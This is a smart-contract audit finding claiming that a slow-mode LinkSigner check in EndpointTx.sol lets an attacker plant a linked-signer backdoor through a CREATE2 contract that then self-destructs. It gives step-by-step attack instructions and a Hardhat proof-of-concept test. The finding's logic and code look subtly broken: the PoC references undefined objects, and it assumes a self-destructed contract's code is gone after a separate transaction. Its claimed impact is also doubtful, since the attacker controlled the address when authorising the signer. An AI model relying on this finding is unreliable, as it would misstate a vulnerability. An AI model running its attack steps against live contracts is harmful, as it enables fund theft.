### Title
Stale Slow-Mode LinkSigner Executes After CREATE2 Contract Destruction, Granting Attacker Persistent Linked-Signer Backdoor — (`core/contracts/EndpointTx.sol`)

---

### Summary

The slow-mode `LinkSigner` path in `processSlowModeTransactionImpl` validates the sender only by comparing the address portion of the `txn.sender` bytes32 against the stored `sender` address. It never verifies that the original submitter still controls that address at execution time. An attacker who briefly controls a CREATE2-deployed contract at address A can submit a slow-mode `LinkSigner` transaction naming their EOA as the linked signer, destroy the contract, and after the 3-day delay the transaction executes unconditionally — permanently setting `linkedSigners[subaccount_A] = attacker_EOA` even though the attacker no longer owns address A.

---

### Finding Description

**Relevant code — `validateSender`:** [1](#0-0) 

The check is purely a static address-equality test against the value frozen into `slowModeTxs[...].sender` at submission time. There is no liveness check on whether the submitter still controls that address.

**Relevant code — slow-mode `LinkSigner` execution:** [2](#0-1) 

`requireSubaccount` only checks that the subaccount was ever registered: [3](#0-2) 

**Submission path — `sender` is frozen as `msg.sender` at submission time:** [4](#0-3) 

**Deposit path — anyone can register a subaccount for any address:** [5](#0-4) 

`depositCollateralWithReferral` stores `sender = address(bytes20(subaccount))` (the address portion of the subaccount), not `msg.sender`. Any caller can pay the deposit and register a subaccount for an arbitrary address A.

---

### Concrete Attack Steps

1. **Deploy** a contract at address A via CREATE2.
2. **Register** subaccount `bytes32(A || suffix)` by calling `depositCollateralWithReferral` from the attacker's EOA (anyone can pay; `sender` stored = A). This queues a `DepositCollateral` slow-mode tx with `sender = A`.
3. **Submit** a slow-mode `LinkSigner` tx from the contract at A: `txn.sender = bytes32(A || suffix)`, `txn.signer = attacker_EOA`. The contract at A pays `chargeSlowModeFee`. The stored `sender = A`.
4. **Destroy** the contract at A (`selfdestruct`). Address A now has no code.
5. **Wait** 3 days. `executeSlowModeTransaction` is called (by anyone).
   - First, the `DepositCollateral` tx executes: `validateSender` passes (A == A), `_recordSubaccount` registers the subaccount.
   - Then, the `LinkSigner` tx executes: `validateSender(bytes32(A||suffix), A)` passes, `requireSubaccount` passes, and `linkedSigners[bytes32(A||suffix)] = attacker_EOA` is written.
6. **Profit.** The attacker's EOA is now the linked signer for subaccount A. The attacker can sign `WithdrawCollateral` or order transactions on behalf of subaccount A.

---

### Impact Explanation

`linkedSigners` is used in `validateSignature` / `validateCompactSignature` to authorize all signed sequencer-path transactions including `WithdrawCollateral`, `WithdrawCollateralV2`, `MatchOrders`, `MintNlp`, `BurnNlp`, and `TransferQuote`: [6](#0-5) 

Any funds deposited into subaccount A — whether by the attacker before destruction or by a victim who later acquires address A (e.g., via a CREATE2 factory sale) — can be drained by the attacker's EOA. This satisfies the Critical scope: **unauthorized privileged outcome** (linked-signer hijack) enabling **asset theft**.

---

### Likelihood Explanation

- CREATE2 deployment and `selfdestruct` are standard EVM primitives available on all target chains.
- The attacker only needs to pay a slow-mode fee and a minimum deposit; no privileged access is required.
- The 3-day delay is a practical but not a security barrier — the attacker simply waits.
- The most profitable variant is selling the CREATE2 factory (or the address) to a victim after queuing the backdoor, then executing the slow-mode tx after the victim deposits.

---

### Recommendation

At execution time of a slow-mode `LinkSigner` transaction, verify that the stored `sender` address still has code (i.e., `sender.code.length > 0`) **or** is an EOA that signed the transaction. Alternatively, require that slow-mode `LinkSigner` submissions include an EIP-712 signature from the subaccount owner (matching the signed fast-path `LinkSigner` flow in `processTransactionImpl`), eliminating the address-equality-only check entirely. [7](#0-6) 

The fast-path `LinkSigner` (above) already requires a valid EIP-712 signature. The slow-mode path should enforce the same requirement rather than relying solely on `msg.sender` identity frozen at submission time.

---

### Proof of Concept

```solidity
// Hardhat test (chainId 31337 — no silent catch)
it("CREATE2 selfdestruct backdoor sets linkedSigner after destruction", async () => {
    // 1. Deploy attacker contract at address A via CREATE2
    const AttackerFactory = await ethers.getContractFactory("AttackerContract");
    const salt = ethers.utils.id("salt");
    const attackerContract = await factory.deploy(salt); // CREATE2
    const addrA = attackerContract.address;

    // 2. Register subaccount for addrA (anyone can call depositCollateralWithReferral)
    const subaccount = ethers.utils.hexZeroPad(addrA, 32); // addrA || 0x000...000
    await quoteToken.approve(endpoint.address, depositAmount);
    await endpoint.depositCollateralWithReferral(subaccount, QUOTE_PRODUCT_ID, depositAmount, "");

    // 3. Contract at A submits slow-mode LinkSigner(sender=subaccount, signer=attackerEOA)
    const linkSignerTx = encodeLinkSigner(subaccount, attackerEOA.address);
    await attackerContract.submitLinkSignerAndDestroy(endpoint.address, linkSignerTx);
    // attackerContract.submitLinkSignerAndDestroy:
    //   quoteToken.approve(endpoint, fee);
    //   endpoint.submitSlowModeTransaction(linkSignerTx);
    //   selfdestruct(attacker);

    // 4. Verify contract at A is destroyed
    expect(await ethers.provider.getCode(addrA)).to.equal("0x");

    // 5. Advance time past 3-day delay
    await ethers.provider.send("evm_increaseTime", [3 * 24 * 3600 + 1]);
    await ethers.provider.send("evm_mine", []);

    // 6. Execute both slow-mode txs (deposit first, then LinkSigner)
    await endpoint.executeSlowModeTransaction(); // DepositCollateral → registers subaccount
    await endpoint.executeSlowModeTransaction(); // LinkSigner → sets linkedSigner

    // 7. Assert backdoor is set
    const linkedSigner = await endpoint.getLinkedSigner(subaccount);
    expect(linkedSigner).to.equal(attackerEOA.address); // PASSES — invariant broken
});
```

### Citations

**File:** core/contracts/EndpointTx.sol (L17-23)
```text
    function validateSender(bytes32 txSender, address sender) internal view {
        require(
            address(uint160(bytes20(txSender))) == sender ||
                sender == address(this),
            ERR_SLOW_MODE_WRONG_SENDER
        );
    }
```

**File:** core/contracts/EndpointTx.sol (L172-184)
```text
    function validateSignature(
        bytes32 sender,
        bytes32 digest,
        bytes memory signature,
        bool allowLinkedSigner
    ) internal virtual {
        verifier.validateSignature(
            sender,
            allowLinkedSigner ? getLinkedSigner(sender) : address(0),
            digest,
            signature
        );
    }
```

**File:** core/contracts/EndpointTx.sol (L232-239)
```text
        } else if (txType == IEndpoint.TransactionType.LinkSigner) {
            IEndpoint.LinkSigner memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.LinkSigner)
            );
            validateSender(txn.sender, sender);
            requireSubaccount(txn.sender);
            linkedSigners[txn.sender] = address(uint160(bytes20(txn.signer)));
```

**File:** core/contracts/EndpointTx.sol (L341-380)
```text
        address sender = msg.sender;

        if (txType == IEndpoint.TransactionType.DepositCollateral) {
            revert();
        } else if (txType == IEndpoint.TransactionType.DepositInsurance) {
            IEndpoint.DepositInsurance memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.DepositInsurance)
            );
            require(
                txn.amount >= uint128(SLOW_MODE_FEE),
                ERR_DEPOSIT_TOO_SMALL
            );
            handleDepositTransfer(_getQuote(), sender, uint256(txn.amount));
        } else if (
            txType == IEndpoint.TransactionType.WithdrawInsurance ||
            txType == IEndpoint.TransactionType.DelistProduct ||
            txType == IEndpoint.TransactionType.DumpFees ||
            txType == IEndpoint.TransactionType.RebalanceXWithdraw ||
            txType == IEndpoint.TransactionType.UpdateTierFeeRates ||
            txType == IEndpoint.TransactionType.AddNlpPool ||
            txType == IEndpoint.TransactionType.UpdateNlpPool ||
            txType == IEndpoint.TransactionType.DeleteNlpPool ||
            txType == IEndpoint.TransactionType.ForceRebalanceNlpPool ||
            txType == IEndpoint.TransactionType.NlpProfitShare ||
            txType == IEndpoint.TransactionType.UpdateBuilder
        ) {
            require(sender == owner());
        } else {
            chargeSlowModeFee(_getQuote(), sender);
            slowModeFees += SLOW_MODE_FEE;
        }

        IEndpoint.SlowModeConfig memory _slowModeConfig = slowModeConfig;
        requireUnsanctioned(sender);
        slowModeTxs[_slowModeConfig.txCount++] = IEndpoint.SlowModeTx({
            executableAt: uint64(block.timestamp) + SLOW_MODE_TX_DELAY, // hardcoded to three days
            sender: sender,
            tx: transaction
        });
```

**File:** core/contracts/EndpointTx.sol (L576-590)
```text
        } else if (txType == IEndpoint.TransactionType.LinkSigner) {
            IEndpoint.SignedLinkSigner memory signedTx = abi.decode(
                transaction[1:],
                (IEndpoint.SignedLinkSigner)
            );
            validateSignedTx(
                signedTx.tx.sender,
                signedTx.tx.nonce,
                transaction,
                signedTx.signature,
                true
            );
            linkedSigners[signedTx.tx.sender] = address(
                uint160(bytes20(signedTx.tx.signer))
            );
```

**File:** core/contracts/EndpointStorage.sol (L74-81)
```text
    function requireSubaccount(bytes32 subaccount) internal view {
        require(
            subaccount == X_ACCOUNT ||
                subaccount == N_ACCOUNT ||
                (subaccountIds[subaccount] != 0),
            ERR_REQUIRES_DEPOSIT
        );
    }
```

**File:** core/contracts/Endpoint.sol (L123-166)
```text
    function depositCollateralWithReferral(
        bytes32 subaccount,
        uint32 productId,
        uint128 amount,
        string memory
    ) public {
        require(!RiskHelper.isIsolatedSubaccount(subaccount), ERR_UNAUTHORIZED);

        address sender = address(bytes20(subaccount));

        // depositor / depositee need to be unsanctioned
        requireUnsanctioned(msg.sender);
        requireUnsanctioned(sender);

        if (!isValidDepositAmount(subaccount, productId, amount)) {
            // we cannot revert here, otherwise direct deposit could be blocked when there are
            // multiple assets awaiting credit but one of them is below the minimum deposit amount.
            // we can just skip the deposit and continue with the next asset.
            return;
        }

        handleDepositTransfer(
            IERC20Base(spotEngine.getToken(productId)),
            msg.sender,
            uint256(amount)
        );
        // copy from submitSlowModeTransaction
        SlowModeConfig memory _slowModeConfig = slowModeConfig;

        slowModeTxs[_slowModeConfig.txCount++] = SlowModeTx({
            executableAt: uint64(block.timestamp) + SLOW_MODE_TX_DELAY, // hardcoded to three days
            sender: sender,
            tx: abi.encodePacked(
                uint8(TransactionType.DepositCollateral),
                abi.encode(
                    DepositCollateral({
                        sender: subaccount,
                        productId: productId,
                        amount: amount
                    })
                )
            )
        });
        slowModeConfig = _slowModeConfig;
```
